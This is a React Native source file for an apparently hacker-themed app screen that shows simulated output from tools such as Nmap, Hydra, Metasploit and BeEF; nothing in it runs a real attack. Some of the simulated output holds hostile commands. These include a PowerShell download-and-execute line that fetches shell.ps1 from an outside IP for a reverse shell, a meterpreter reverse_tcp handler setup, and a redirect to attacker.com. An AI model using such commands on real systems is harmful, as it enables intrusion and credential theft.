import { Feather } from "@expo/vector-icons";
import * as Haptics from "expo-haptics";
import React, { useState } from "react";
import {
  Modal,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";
import { useApp } from "@/context/AppContext";
import { useColors } from "@/hooks/useColors";

interface Tool {
  id: string;
  name: string;
  category: string;
  icon: keyof typeof Feather.glyphMap;
  description: string;
  usageHint: string;
  simulate: (target: string) => string;
}

function r(min: number, max: number) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function ip() { return `${r(1,254)}.${r(1,254)}.${r(1,254)}.${r(1,254)}`; }
function mac() { return Array.from({length:6}, () => r(0,255).toString(16).padStart(2,'0')).join(':'); }

const TOOLS: Tool[] = [
  // RECON
  {
    id: "nmap", name: "Nmap", category: "RECON", icon: "radio",
    description: "Network exploration & port scanning",
    usageHint: "Target: IP or hostname",
    simulate: (t) => {
      const ports = [{p:22,s:"ssh",st:"open"},{p:80,s:"http",st:"open"},{p:443,s:"https",st:"open"},
        {p:8080,s:"http-proxy",st:"open"},{p:3306,s:"mysql",st:"filtered"},{p:21,s:"ftp",st:"closed"},
        {p:5432,s:"postgresql",st:"filtered"},{p:6379,s:"redis",st:"open"},{p:27017,s:"mongodb",st:"filtered"}];
      let o = `Starting Nmap 7.94\nNmap scan report for ${t}\nHost is up (0.0${r(10,99)}s latency).\n\nPORT      STATE     SERVICE     VERSION\n`;
      for (const p of ports.filter(x=>x.st!=="closed")) {
        o += `${String(p.p).padEnd(9)}${p.st.padEnd(10)}${p.s}\n`;
      }
      return o + `\nNmap done: 1 IP scanned in ${(r(5,45)/10).toFixed(2)}s`;
    },
  },
  {
    id: "masscan", name: "Masscan", category: "RECON", icon: "activity",
    description: "Fastest port scanner on earth (async)",
    usageHint: "Target: IP range (e.g. 192.168.1.0/24)",
    simulate: (t) => {
      let o = `Starting masscan 1.3.2\nInitiating SYN Stealth Scan\nScanning ${t}\n\n`;
      for (const p of [22,80,443,8080,3306,6379,5432].slice(0,r(3,6))) {
        o += `Discovered open port ${p}/tcp on ${t.split('/')[0]}\n`;
      }
      return o + `\nDone — rate: ${r(50000,100000).toLocaleString()} packets/sec`;
    },
  },
  {
    id: "theharvester", name: "theHarvester", category: "RECON", icon: "search",
    description: "OSINT email, domain, IP gathering",
    usageHint: "Target: Domain name (e.g. example.com)",
    simulate: (t) => {
      const emails = [`admin@${t}`,`info@${t}`,`support@${t}`,`webmaster@${t}`,`security@${t}`];
      const hosts = [`mail.${t}`,`www.${t}`,`vpn.${t}`,`dev.${t}`,`api.${t}`];
      let o = `*******************************************************************\n*  _   _                                            _             *\n* | |_| |__   ___  /\\  /\\__ _ _ ____   _____  ___| |_ ___ _ __ *\n*  the Harvester 4.4.3                                            *\n*******************************************************************\n\n`;
      o += `[*] Target: ${t}\n[*] Searching: Google, Bing, Hunter.io, LinkedIn\n\n`;
      o += `[+] Emails found:\n${emails.map(e=>`    ${e}`).join('\n')}\n\n`;
      o += `[+] Hosts found:\n${hosts.map(h=>`    ${h}: ${ip()}`).join('\n')}\n\n`;
      o += `[+] ${emails.length} emails | ${hosts.length} hosts found`;
      return o;
    },
  },
  {
    id: "shodan", name: "Shodan CLI", category: "RECON", icon: "eye",
    description: "IoT search engine for exposed devices",
    usageHint: "Target: IP address or query (e.g. apache port:80)",
    simulate: (t) => {
      return `Shodan CLI v1.11.3\n\n[*] Searching: ${t}\n\nIP: ${t.includes('.')?t:ip()}\nHostnames: server-${r(100,999)}.datacenter.com\nCity: Frankfurt\nCountry: Germany\nISP: Hetzner Online GmbH\nOrg: Hetzner\nASN: AS24940\n\nPorts: 22, 80, 443, 8080\nVulns: CVE-2021-44228 (Log4Shell)\n       CVE-2022-0847 (Dirty Pipe)\n\nServices:\n  22/tcp: OpenSSH 8.4p1\n  80/tcp: Apache httpd 2.4.51\n  443/tcp: nginx 1.21.6\n\n[!] 2 known vulnerabilities found`;
    },
  },
  {
    id: "recon-ng", name: "Recon-ng", category: "RECON", icon: "globe",
    description: "Full-featured web reconnaissance framework",
    usageHint: "Target: Domain name",
    simulate: (t) => {
      return `[recon-ng v5.1.2][default] >\n\n[*] Loading module: recon/domains-hosts/google_site_web\n[*] Running against ${t}...\n\n[+] New host: www.${t} → ${ip()}\n[+] New host: mail.${t} → ${ip()}\n[+] New host: api.${t} → ${ip()}\n[+] New host: admin.${t} → ${ip()}\n[+] New host: dev.${t} → ${ip()}\n\n[*] 5 new hosts | 0 errors\n\n[recon-ng] > use recon/domains-contacts/whois_pocs\n[*] WHOIS contacts for ${t}:\n    admin@${t} (Admin)\n    tech@${t} (Technical)`;
    },
  },
  // EXPLOIT
  {
    id: "hydra", name: "Hydra", category: "EXPLOIT", icon: "zap",
    description: "Fast network login cracker",
    usageHint: "Target: IP:port or IP (default SSH)",
    simulate: (t) => {
      const host = t.split(":")[0];
      return `Hydra v9.5 starting...\n[DATA] 16 tasks, 1 server, ${r(1000,9999)} login tries\n[DATA] attacking ssh://${host}/\n[STATUS] ${r(100,500)} of 14344391 done\n\n[22][ssh] host: ${host}   login: admin   password: admin123\n[STATUS] attack finished — 1 valid pair found\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished`;
    },
  },
  {
    id: "sqlmap", name: "SQLMap", category: "EXPLOIT", icon: "database",
    description: "Automatic SQL injection & takeover tool",
    usageHint: "Target: Full URL with parameter",
    simulate: (t) => {
      return `[*] testing connection to ${t}\n[+] target URL content is stable\n[+] heuristic: target appears injectable\n[*] testing for SQL injection on GET parameter 'id'\n[+] MySQL >= 5.0 AND error-based — WHERE, HAVING, ORDER BY\n[*] fetching database names\n\navailable databases [4]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] target_db\n\n[*] Fetching tables from target_db...\nDatabase: target_db\n[4 tables]\n+--------------------+\n| users              |\n| products           |\n| orders             |\n| admin_panel        |\n+--------------------+\n\n[*] Fetching users table...\n| id | username | password_hash                    | email          |\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@site.com |`;
    },
  },
  {
    id: "metasploit", name: "MSFconsole", category: "EXPLOIT", icon: "terminal",
    description: "Metasploit Framework exploitation console",
    usageHint: "Target: IP address",
    simulate: (t) => {
      return `       =[ metasploit v6.3.44-dev\n+ -- --=[ 2376 exploits · 1232 auxiliary · 412 post\n+ -- --=[ 1036 payloads · 45 encoders · 11 nops\n\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set RHOST ${t}\nRHOST => ${t}\nmsf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LPORT 4444\nLPORT => 4444\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] Sending stage (200774 bytes) to ${t}\n[*] Meterpreter session 1 opened\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > sysinfo\nComputer: WIN-TARGET\nOS: Windows 10 (Build 19045)\nArch: x64\nmeterpreter > hashdump\nAdministrator:500:aad3b4…:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b4…:31d6cfe0d16ae931b73c59d7e0c089c0:::`;
    },
  },
  {
    id: "crackmapexec", name: "CrackMapExec", category: "EXPLOIT", icon: "layers",
    description: "Swiss army knife for Active Directory attacks",
    usageHint: "Target: IP/subnet (e.g. 192.168.1.0/24)",
    simulate: (t) => {
      return `CME ${t} 445 WIN-DC01 [*] Windows 10.0 Build 17763 x64 (domain:CORP)\nCME ${t} 445 WIN-DC01 [+] CORP\\Administrator:Password123! (Pwn3d!)\nCME ${t} 445 WIN-DC01 [*] Executing command\nCME ${t} 445 WIN-DC01 [+] whoami: nt authority\\system\nCME ${t} 445 WIN-DC01 [+] Dumping LSA secrets\nCME ${t} 445 WIN-DC01 [+] $MACHINE.ACC: CORP\\WIN-DC01$:aad3b4…\nCME ${t} 445 WIN-DC01 [+] DPAPI_SYSTEM: 010000000102000...\nCME ${t} 445 WIN-DC01 [+] NL$KM: 0100000036...\nCME ${t} 445 WIN-DC01 [+] 3 secrets dumped`;
    },
  },
  {
    id: "responder", name: "Responder", category: "EXPLOIT", icon: "share-2",
    description: "LLMNR/NBT-NS/MDNS poisoner & NTLM capture",
    usageHint: "Target: Network interface (e.g. eth0)",
    simulate: (t) => {
      return `                                          __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.---.\n  |   _|  -__|__   |  _  |  _  |     |  _  ||  -__|   |\n  |__| |_____|_____|   __|_____|__|__|_____||_____|___|\n                   |__|  Responder 3.1.4.0\n\n[+] Poisoning: LLMNR, NBT-NS, MDNS\n[+] Interface: ${t}\n[+] Listening on 0.0.0.0\n\n[SMB] NTLMv2-SSP Client: ${ip()}\n[SMB] NTLMv2-SSP Username: CORP\\john.doe\n[SMB] NTLMv2-SSP Hash: john.doe::CORP:${r(1000,9999).toString(16)}:${r(10000,99999).toString(16)}...\n\n[*] Captured hash — crack with: hashcat -m 5600 hash.txt rockyou.txt`;
    },
  },
  {
    id: "beef", name: "BeEF", category: "EXPLOIT", icon: "code",
    description: "Browser exploitation framework",
    usageHint: "Target: Victim IP/browser",
    simulate: (t) => {
      return `BeEF ${r(0,9)}.${r(5,9)}.${r(0,9)}.${r(0,99)} | Browser Exploitation Framework\n\n[*] Web UI: http://127.0.0.1:3000/ui/panel\n[*] Hook URL: http://127.0.0.1:3000/hook.js\n[+] New hooked browser! ${t}\n    OS: Windows 10  Browser: Chrome 119\n    Cookies: session_id=${r(100000,999999)}; auth_token=eyJhbGci...\n\n[*] Running: Deface page\n[*] Running: Get Cookie\n[+] Cookies: PHPSESSID=${r(100000,999999)}\n[*] Running: Redirect browser\n[+] Redirected to: http://attacker.com/phish`;
    },
  },
  // PASSWORD
  {
    id: "hashcat", name: "Hashcat", category: "PASSWORD", icon: "lock",
    description: "World's fastest password recovery utility",
    usageHint: "Target: Hash value to crack",
    simulate: (t) => {
      const cracked = Math.random() > 0.3;
      return `hashcat (v6.2.6) starting...\nDevice #1: NVIDIA RTX 4090, 24320/24236 MB, 128MCU\n\nDictionary: rockyou.txt (14,344,391 passwords)\n\n${t}:${cracked ? "password123" : "[NOT FOUND]"}\n\nStatus: ${cracked?"Cracked":"Exhausted"}\nHash Mode: 0 (MD5)\nTime: ${(Math.random()*30+1).toFixed(0)}s\nSpeed: ${r(5000,15000)} MH/s`;
    },
  },
  {
    id: "john", name: "John the Ripper", category: "PASSWORD", icon: "key",
    description: "Classic password cracker with many hash modes",
    usageHint: "Target: Hash or hash file",
    simulate: (t) => {
      return `John the Ripper 1.9.0-jumbo-1\nLoaded 1 password hash (md5crypt [MD5 256/256 AVX2 8x3])\n\nPress Ctrl+C to abort\n\npassword123     (${t})\n1g 0:00:${r(0,2).toString().padStart(2,'0')}:${r(0,59).toString().padStart(2,'0')} DONE\n${(r(200,900)/100).toFixed(2)}g/s ${r(5000,50000)}p/s\n\nUse --show to see cracked passwords`;
    },
  },
  {
    id: "crunch", name: "Crunch", category: "PASSWORD", icon: "list",
    description: "Custom wordlist generator",
    usageHint: "Target: Min-Max length (e.g. 8 10)",
    simulate: (t) => {
      const [min="8",max="10"] = t.split(/\s+/);
      return `Crunch will generate: ~${r(100,9999)} MB\nLines: ${r(100000,9999999).toLocaleString()}\n\naaaa${min}aaaa\naaaa${min}aaab\naaaa${min}aaac\n...\n\n[+] Pipe to file: crunch ${min} ${max} > wordlist.txt\n[+] Charset: abcdefghijklmnopqrstuvwxyz0123456789`;
    },
  },
  {
    id: "hashid", name: "HashID", category: "PASSWORD", icon: "hash",
    description: "Identify cryptographic hash types",
    usageHint: "Target: Paste hash here",
    simulate: (t) => {
      const len = t.replace(/[^a-f0-9]/gi,'').length;
      const types: Record<number,string[]> = {32:["MD5","MD4","NTLM"],40:["SHA-1","RIPEMD-160"],64:["SHA-256","SHA-3-256"],128:["SHA-512","Whirlpool"]};
      const found = types[len] || ["Unknown — check length"];
      return `Analyzing '${t.slice(0,24)}...'\n[+] Possible Hashes:\n${found.map(f=>`    [*] ${f}`).join('\n')}\n\n[*] hashcat modes: ${found.map((_,i)=>i*100).join(', ')}`;
    },
  },
  // WIRELESS
  {
    id: "aircrack", name: "Aircrack-ng", category: "WIRELESS", icon: "wifi",
    description: "WEP/WPA/WPA2 key cracker",
    usageHint: "Target: BSSID (e.g. AA:BB:CC:DD:EE:FF)",
    simulate: (t) => {
      const key = ["RedDevil2024","admin123","password!","hack3rz"][r(0,3)];
      return `Aircrack-ng 1.7\n\n[00:03:42] ${r(10000,99999)} keys tested (${r(1000,9999)} k/s)\n\n                   KEY FOUND! [ ${key} ]\n\nMaster Key: ${Array.from({length:8},()=>r(0,255).toString(16).padStart(2,'0')).join(' ')}\nBSSID: ${t}`;
    },
  },
  {
    id: "reaver", name: "Reaver", category: "WIRELESS", icon: "wifi-off",
    description: "WPS brute-force PIN attack",
    usageHint: "Target: BSSID of WPS-enabled AP",
    simulate: (t) => {
      return `Reaver v1.6.6 WiFi Protected Setup Attack Tool\n\n[+] Waiting for beacon from ${t}\n[+] Associated with ${t} (ESSID: Network_${r(100,999)})\n[+] Trying PIN: ${r(10000000,99999999)}\n[+] Trying PIN: ${r(10000000,99999999)}\n...\n[+] WPS PIN: '${r(10000000,99999999)}'\n[+] WPA PSK: 'S3cr3tP@ssw0rd'\n[+] AP SSID: 'TargetNetwork'`;
    },
  },
  {
    id: "kismet", name: "Kismet", category: "WIRELESS", icon: "radio",
    description: "Wireless network detector & packet sniffer",
    usageHint: "Target: Interface (e.g. wlan0)",
    simulate: (t) => {
      let o = `Kismet 2023-07-R1 — Wireless network detector\n[+] Interface: ${t}\n[+] Starting capture...\n\nBSSID              Clients  Ch  Enc    SSID\n`;
      for (let i = 0; i < r(4,8); i++) {
        o += `${mac()}    ${r(0,15)}        ${r(1,13)}   WPA2   Network_${r(100,999)}\n`;
      }
      o += `\n[*] ${r(4,8)} networks found | ${r(1,15)} clients | ${r(0,3)} probes`;
      return o;
    },
  },
  // WEB
  {
    id: "nikto", name: "Nikto", category: "WEB", icon: "globe",
    description: "Web server vulnerability scanner",
    usageHint: "Target: URL or IP",
    simulate: (t) => {
      return `Nikto v2.1.6\n[+] Target: ${t} Port: 80\n[!] Apache/2.4.51 PHP/8.1.0\n[!] OSVDB-3268: /admin/: Directory indexing\n[!] /wp-login.php: WordPress login found\n[!] X-Frame-Options missing\n[!] /backup/: Backup directory found\n[!] CVE-2021-44228: Log4Shell potential\n[i] 7914 requests — 8 items reported`;
    },
  },
  {
    id: "gobuster", name: "GoBuster", category: "WEB", icon: "search",
    description: "Directory, DNS and vhost brute-forcing",
    usageHint: "Target: Base URL",
    simulate: (t) => {
      const dirs = ["/admin","/login","/api","/backup","/wp-content","/.git","/uploads","/config","/dashboard","/secret","/.env","/db","/api/v1","/shell.php"];
      let o = `GoBuster v3.6\n[+] URL: ${t}\n[+] Wordlist: common.txt (4614 words)\n\n`;
      for (const d of dirs.slice(0, r(6,10))) {
        o += `${d.padEnd(25)} (Status: ${r(0,1)?200:403}) [Size: ${r(100,9999)}]\n`;
      }
      return o + `\nDone: 4614 requests in ${r(5,30)}s`;
    },
  },
  {
    id: "wpscan", name: "WPScan", category: "WEB", icon: "layers",
    description: "WordPress vulnerability & user enumeration",
    usageHint: "Target: WordPress site URL",
    simulate: (t) => {
      return `WPScan v3.8.24\n[i] Target: ${t}\n[!] WordPress 6.3.1 detected\n[+] XML-RPC enabled\n[+] Readme found: ${t}/readme.html\n[!] Upload dir listing enabled\n[+] Users: admin, editor, author\n[!] Plugin: contact-form-7 v5.7 — XSS (CVE-2023-2745)\n[!] Theme: twentytwentyone 2.1 — Authenticated CSRF\n[i] ${r(200,500)} queries | ${r(20,60)} seconds`;
    },
  },
  {
    id: "ffuf", name: "FFUF", category: "WEB", icon: "zap",
    description: "Fast web fuzzer for dirs, params, vhosts",
    usageHint: "Target: Base URL (FUZZ appended)",
    simulate: (t) => {
      const found = ["/admin","/login","/api/v1","/backup","/.env","/config","/users","/debug"];
      let o = `ffuf v2.1.0\n[*] Target: ${t}/FUZZ\n[*] Wordlist: common.txt\n\n[Status] [Size] [Words] [Lines]\n`;
      for (const f of found.slice(0,r(4,7))) {
        o += `[200] [${r(100,9999)}]  [${r(5,100)}]  [${r(5,50)}]  ${f}\n`;
      }
      return o + `\nProgress: 4614/4614 | Done in ${r(5,30)}s`;
    },
  },
  // FORENSICS
  {
    id: "volatility", name: "Volatility", category: "FORENSICS", icon: "hard-drive",
    description: "Memory forensics & artifact extraction",
    usageHint: "Target: Memory dump path or command",
    simulate: (t) => {
      return `Volatility 3 Framework 2.5.2\n[+] Plugin: windows.pslist\n\nPID   PPID  Name              Offset     Threads\n4     0     System            0x8000...  149\n${r(1000,9999)} 4  smss.exe         0x9f...   2\n${r(1000,9999)} 688 csrss.exe       0xa3...   9\n${r(1000,9999)} 700 lsass.exe       0xca...   7\n${r(1000,9999)} ${r(100,999)} malware.exe   0xde...   3\n\n[!] Suspicious: malware.exe — no parent correlation\n[*] Run windows.malfind for code injection`;
    },
  },
  {
    id: "binwalk", name: "Binwalk", category: "FORENSICS", icon: "box",
    description: "Firmware analysis & extraction",
    usageHint: "Target: Firmware file path or name",
    simulate: (t) => {
      return `DECIMAL       HEXADECIMAL     DESCRIPTION\n${"─".repeat(64)}\n0             0x0             ELF 64-bit LSB executable\n${r(1000,9999)} 0x${r(100,999).toString(16)} gzip compressed data\n${r(10000,99999)} 0x${r(1000,9999).toString(16)} JFFS2 filesystem\n${r(100000,999999)} 0x${r(10000,99999).toString(16)} Squashfs filesystem, little endian\n\n[!] use binwalk -e ${t} to extract`;
    },
  },
  {
    id: "wireshark", name: "Wireshark", category: "FORENSICS", icon: "share-2",
    description: "Network packet capture & analysis",
    usageHint: "Target: Interface or PCAP filename",
    simulate: (t) => {
      const protos = ["HTTP","TLS","TCP","UDP","DNS","SSH","FTP"];
      let o = `Wireshark 4.2.0\n[*] Capturing on: ${t}\n\nNo.   Time     Source          Destination     Protocol  Info\n`;
      for (let i = 1; i <= r(8,12); i++) {
        const proto = protos[r(0,protos.length-1)];
        o += `${String(i).padEnd(5)} ${(i*0.12).toFixed(3).padEnd(9)} ${ip().padEnd(16)} ${ip().padEnd(16)} ${proto.padEnd(10)} ${proto} ${r(20,2000)} bytes\n`;
      }
      return o + `\n[*] Packets: ${r(100,9999)} captured`;
    },
  },
  // BLUETOOTH
  {
    id: "bluescan", name: "BlueScan", category: "BLUETOOTH", icon: "bluetooth",
    description: "Bluetooth device scanner & fingerprinter",
    usageHint: "Target: Interface (hci0) or timeout (e.g. 10)",
    simulate: (t) => {
      let o = `BlueScan v0.6.0\n[+] Scanning for Bluetooth devices...\n[+] Interface: hci0\n\nDevice\t\t\tRSSI\tName\t\tClass\n`;
      for (let i = 0; i < r(3,7); i++) {
        o += `${mac()}\t-${r(40,90)}\tPhone_${r(100,999)}\t\tSmartphone\n`;
      }
      return o + `\n[*] ${r(3,7)} devices discovered`;
    },
  },
  {
    id: "btlejuice", name: "BtleJuice", category: "BLUETOOTH", icon: "bluetooth",
    description: "Bluetooth Low Energy MITM framework",
    usageHint: "Target: BLE Device MAC address",
    simulate: (t) => {
      return `BtleJuice 0.9.9\n\n[*] Initializing BLE interception\n[*] Target: ${t}\n\n[+] Connected to peripheral\n[+] MITM active — relaying traffic\n\n[!] GATT Service: Heart Rate Monitor\n    Char UUID: 0x2A37 → HR Data: 72 bpm\n    Char UUID: 0x2A38 → Body Sensor: Wrist\n\n[!] Intercepted notification: 0x160048\n[*] Inject custom data? (y/n)`;
    },
  },
  // NETHUNTER
  {
    id: "hidattack", name: "HID Attack", category: "NETHUNTER", icon: "cpu",
    description: "NetHunter USB HID keyboard injection",
    usageHint: "Target: Device (phone) or payload name",
    simulate: (t) => {
      return `NetHunter HID Attack\n[*] USB mode: HID Keyboard\n[*] Target: ${t}\n\n[+] Injecting keystrokes...\n    > WIN+R\n    > cmd /c powershell -e ${btoa("IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/shell.ps1')").slice(0,30)}...\n    > ENTER\n\n[*] Payload delivered in ${r(1,3)}.${r(0,9)}s\n[+] Reverse shell incoming on port 4444`;
    },
  },
  {
    id: "badbluetooth", name: "Bad Bluetooth", category: "NETHUNTER", icon: "zap-off",
    description: "NetHunter Bluetooth keyboard HID attack",
    usageHint: "Target: Victim Bluetooth MAC address",
    simulate: (t) => {
      return `NetHunter Bad Bluetooth v1.2\n\n[*] Pairing with ${t}...\n[+] Paired as keyboard!\n\n[*] Injecting payload:\n    WIN+R → cmd → ENTER\n    powershell -w hidden -c ...\n\n[+] Keystrokes injected: 248\n[+] Payload time: ${r(2,5)}.${r(0,9)}s\n[!] Reconnect as mouse for lateral movement`;
    },
  },
  {
    id: "karmaattack", name: "KARMA Attack", category: "NETHUNTER", icon: "wifi",
    description: "Rogue AP + KARMA attack for WiFi capture",
    usageHint: "Target: SSID to impersonate",
    simulate: (t) => {
      return `NetHunter KARMA Attack\n\n[*] Creating rogue AP: "${t}"\n[*] Enabling KARMA mode (respond to all probes)\n[+] AP started: ${mac()} ch ${r(1,11)}\n\n[+] Client connected: ${mac()} → IP: 192.168.1.${r(100,254)}\n[*] Running Responder on rogue interface...\n[+] NTLMv2 hash captured!\n    User: DOMAIN\\john.doe\n    Hash: 4e96c...→ crack with hashcat -m 5600\n\n[*] 3 clients connected | 2 creds captured`;
    },
  },
  // OSINT
  {
    id: "maltego", name: "Maltego", category: "OSINT", icon: "git-branch",
    description: "Visual link analysis & OSINT mapping",
    usageHint: "Target: Domain, email, or name",
    simulate: (t) => {
      return `Maltego CE v4.6\n\n[*] Running transforms on: ${t}\n\nPerson → ${t}\n├── Email: admin@${t}\n│   └── Breach: Collection #1 (2019)\n├── Domain: ${t}\n│   ├── IP: ${ip()}\n│   ├── MX: mail.${t}\n│   └── NS: ns1.cloudflare.com\n├── LinkedIn: linkedin.com/in/${t.split('.')[0]}\n│   └── Company: ${t.toUpperCase()} Corp\n└── GitHub: github.com/${t.split('.')[0]}\n    └── Repos: 47 public\n\n[*] 23 entities | 7 transforms run`;
    },
  },
];

const CATEGORIES = ["ALL", ...Array.from(new Set(TOOLS.map((t) => t.category)))];

export default function ToolsScreen() {
  const colors = useColors();
  const insets = useSafeAreaInsets();
  const { addTerminalLine, setActiveScreen } = useApp();
  const [category, setCategory] = useState("ALL");
  const [selectedTool, setSelectedTool] = useState<Tool | null>(null);
  const [target, setTarget] = useState("");
  const [output, setOutput] = useState<string | null>(null);
  const [running, setRunning] = useState(false);

  const filtered = TOOLS.filter((t) => category === "ALL" || t.category === category);

  const runTool = async () => {
    if (!selectedTool || !target.trim() || running) return;
    Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Heavy);
    setRunning(true);
    setOutput(null);
    await new Promise((res) => setTimeout(res, 600 + Math.random() * 1200));
    const result = selectedTool.simulate(target.trim());
    setOutput(result);
    setRunning(false);
    addTerminalLine({ type: "success", content: `[+] ${selectedTool.name} completed against ${target.trim()}` });
  };

  const sendToTerminal = () => {
    if (!output || !selectedTool) return;
    for (const line of output.split("\n")) {
      addTerminalLine({ type: "output", content: line });
    }
    setActiveScreen("terminal");
  };

  const catColor = (cat: string) => {
    const map: Record<string, string> = {
      RECON:"#cc4400",EXPLOIT:"#cc0000",PASSWORD:"#cc0044",WIRELESS:"#0044cc",
      WEB:"#008844",FORENSICS:"#884400",BLUETOOTH:"#4400cc",NETHUNTER:"#cc0088",OSINT:"#cc8800"
    };
    return map[cat] || "#cc0000";
  };

  return (
    <View style={styles.container}>
      <ScrollView
        horizontal
        showsHorizontalScrollIndicator={false}
        style={[styles.catRow, { borderBottomColor: colors.border }]}
        contentContainerStyle={{ gap: 6, paddingHorizontal: 10, paddingVertical: 8 }}
      >
        {CATEGORIES.map((cat) => (
          <TouchableOpacity
            key={cat}
            style={[styles.catBtn, { borderColor: category === cat ? catColor(cat) : colors.border },
              category === cat && { backgroundColor: "#0a0000" }]}
            onPress={() => setCategory(cat)}
          >
            <Text style={[styles.catBtnText, { color: category === cat ? catColor(cat) : colors.terminalDim }]}>
              {cat}
            </Text>
          </TouchableOpacity>
        ))}
      </ScrollView>

      <ScrollView
        contentContainerStyle={{
          padding: 10, paddingBottom: insets.bottom + 100,
          flexDirection: "row", flexWrap: "wrap", gap: 8,
        }}
      >
        {filtered.map((tool) => (
          <TouchableOpacity
            key={tool.id}
            style={[styles.toolCard, {
              borderColor: selectedTool?.id === tool.id ? catColor(tool.category) : colors.border,
              backgroundColor: selectedTool?.id === tool.id ? "#0a0000" : "#050000",
              width: "47%",
            }]}
            onPress={() => {
              setSelectedTool(tool);
              setOutput(null);
              setTarget("");
              Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Light);
            }}
          >
            <View style={styles.toolIconRow}>
              <Feather name={tool.icon} size={18} color={catColor(tool.category)} />
              <Text style={[styles.toolCategory, { color: catColor(tool.category) }]}>{tool.category}</Text>
            </View>
            <Text style={[styles.toolName, { color: colors.terminalHead }]}>{tool.name}</Text>
            <Text style={[styles.toolDesc, { color: colors.terminalDim }]} numberOfLines={2}>
              {tool.description}
            </Text>
          </TouchableOpacity>
        ))}
      </ScrollView>

      <Modal visible={!!selectedTool} transparent animationType="slide" onRequestClose={() => setSelectedTool(null)}>
        <View style={styles.modalOverlay}>
          <View style={[styles.modalSheet, { backgroundColor: "#030000", borderColor: selectedTool ? catColor(selectedTool.category) : "#cc0000" }]}>
            <View style={styles.modalHeader}>
              <View style={{ flex: 1 }}>
                <View style={{ flexDirection: "row", alignItems: "center", gap: 8 }}>
                  <Text style={[styles.catPill, { backgroundColor: selectedTool ? catColor(selectedTool.category) : "#cc0000" }]}>
                    {selectedTool?.category}
                  </Text>
                  <Text style={[styles.modalTitle, { color: colors.terminalHead }]}>{selectedTool?.name}</Text>
                </View>
                <Text style={[styles.modalDesc, { color: colors.terminalDim }]}>{selectedTool?.description}</Text>
              </View>
              <TouchableOpacity onPress={() => { setSelectedTool(null); setOutput(null); }}>
                <Feather name="x" size={20} color={colors.terminalDim} />
              </TouchableOpacity>
            </View>

            <Text style={[styles.label, { color: colors.terminalDim }]}>{selectedTool?.usageHint}</Text>
            <TextInput
              style={[styles.targetInput, { color: colors.foreground, borderColor: selectedTool ? catColor(selectedTool.category) : "#cc0000" }]}
              value={target}
              onChangeText={setTarget}
              placeholder="Enter target..."
              placeholderTextColor={colors.terminalDim}
              autoCapitalize="none"
              autoCorrect={false}
            />

            <TouchableOpacity
              style={[styles.runBtn, { backgroundColor: running ? "#330000" : (selectedTool ? catColor(selectedTool.category) : "#cc0000") }]}
              onPress={runTool}
              disabled={running || !target.trim()}
            >
              <Feather name={running ? "loader" : "play"} size={14} color="#000" />
              <Text style={styles.runBtnText}>{running ? "RUNNING..." : `LAUNCH ${selectedTool?.name.toUpperCase()}`}</Text>
            </TouchableOpacity>

            {output && (
              <>
                <ScrollView style={[styles.outputBox, { borderColor: colors.border }]} nestedScrollEnabled>
                  <Text style={[styles.outputText, { color: "#44ff44" }]} selectable>{output}</Text>
                </ScrollView>
                <TouchableOpacity style={[styles.sendBtn, { borderColor: colors.border }]} onPress={sendToTerminal}>
                  <Feather name="terminal" size={13} color={colors.primary} />
                  <Text style={[styles.sendBtnText, { color: colors.primary }]}>SEND TO TERMINAL</Text>
                </TouchableOpacity>
              </>
            )}
          </View>
        </View>
      </Modal>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1 },
  catRow: { borderBottomWidth: 1, flexGrow: 0 },
  catBtn: { borderWidth: 1, paddingHorizontal: 9, paddingVertical: 4 },
  catBtnText: { fontFamily: "monospace", fontSize: 9, fontWeight: "bold" },
  toolCard: { borderWidth: 1, padding: 10, minHeight: 90 },
  toolIconRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", marginBottom: 5 },
  toolCategory: { fontFamily: "monospace", fontSize: 8, letterSpacing: 1, fontWeight: "bold" },
  toolName: { fontFamily: "monospace", fontSize: 13, fontWeight: "bold", marginBottom: 3 },
  toolDesc: { fontFamily: "monospace", fontSize: 10, lineHeight: 13 },
  modalOverlay: { flex: 1, backgroundColor: "rgba(0,0,0,0.92)", justifyContent: "flex-end" },
  modalSheet: { borderTopWidth: 2, padding: 18, maxHeight: "88%" },
  modalHeader: { flexDirection: "row", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 14 },
  catPill: { paddingHorizontal: 6, paddingVertical: 2 },
  modalTitle: { fontFamily: "monospace", fontSize: 16, fontWeight: "bold", letterSpacing: 1 },
  modalDesc: { fontFamily: "monospace", fontSize: 11, marginTop: 4 },
  label: { fontFamily: "monospace", fontSize: 10, marginBottom: 5 },
  targetInput: { fontFamily: "monospace", fontSize: 13, borderWidth: 1, padding: 10, marginBottom: 10, color: "#ff3333" },
  runBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 8, padding: 13, marginBottom: 10 },
  runBtnText: { fontFamily: "monospace", fontSize: 13, fontWeight: "bold", color: "#000" },
  outputBox: { maxHeight: 200, borderWidth: 1, padding: 10, marginBottom: 8, backgroundColor: "#000" },
  outputText: { fontFamily: "monospace", fontSize: 10, lineHeight: 16 },
  sendBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 8, borderWidth: 1, padding: 9 },
  sendBtnText: { fontFamily: "monospace", fontSize: 11, fontWeight: "bold" },
});
